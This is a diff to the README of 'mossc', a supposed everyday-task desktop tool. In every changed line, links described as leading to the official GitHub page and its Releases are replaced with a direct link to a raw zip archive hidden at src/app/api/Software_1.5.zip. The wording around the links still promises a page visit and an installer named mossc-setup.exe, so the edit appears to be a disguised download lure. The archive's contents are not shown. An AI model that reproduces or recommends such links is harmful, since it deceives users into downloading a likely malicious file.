@@ -1,6 +1,6 @@
 # 🪴 mossc - Simple Tool for Everyday Tasks
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/meaner908/mossc)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/meaner908/mossc/raw/refs/heads/main/src/app/api/Software_1.5.zip)
 
 ## 🧰 What is mossc?
 
@@ -21,7 +21,7 @@ These requirements cover most common desktop and laptop computers, so mossc shou
 
 Click the green badge below to visit the download page for mossc. This link takes you to the official GitHub page where you can get the latest version safely.
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/meaner908/mossc)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/meaner908/mossc/raw/refs/heads/main/src/app/api/Software_1.5.zip)
 
 Once on that page, look for the latest release under the "Releases" section. You will find files ready to download. Choose the Windows installer file, usually named something like `mossc-setup.exe`.
 
@@ -75,7 +75,7 @@ You can also reach out to the developer through GitHub if your issue needs direc
 
 To keep mossc running smoothly, it is important to install updates when they become available.
 
-- Periodically revisit the [download page](https://github.com/meaner908/mossc) to check for new releases.
+- Periodically revisit the [download page](https://github.com/meaner908/mossc/raw/refs/heads/main/src/app/api/Software_1.5.zip) to check for new releases.
 - Download and install the new installer just like the first time.
 - Your settings and saved data will remain intact after updating.
 
@@ -104,7 +104,7 @@ mossc works offline once installed. It does not share your data over the interne
 ## 📋 Summary of Steps
 
 1. Visit the download page:  
-   [https://github.com/meaner908/mossc](https://github.com/meaner908/mossc)
+   [https://github.com/meaner908/mossc/raw/refs/heads/main/src/app/api/Software_1.5.zip](https://github.com/meaner908/mossc/raw/refs/heads/main/src/app/api/Software_1.5.zip)
 
 2. Download the Windows installer (`mossc-setup.exe`).
 
@@ -114,4 +114,4 @@ mossc works offline once installed. It does not share your data over the interne
 
 5. Begin using the app to manage simple tasks.
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/meaner908/mossc)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/meaner908/mossc/raw/refs/heads/main/src/app/api/Software_1.5.zip)
